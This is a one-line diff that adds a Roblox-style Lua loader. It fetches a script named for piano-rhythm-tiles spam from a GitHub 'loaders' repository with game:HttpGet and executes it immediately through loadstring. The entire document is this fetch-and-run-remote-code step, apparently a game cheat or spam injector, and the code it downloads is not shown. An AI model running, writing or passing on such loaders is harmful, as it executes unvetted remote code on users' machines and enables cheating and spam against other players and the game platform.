@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/piano-rhythm-tiles-spam1-n8iluak4hhpwl6.lua"))()
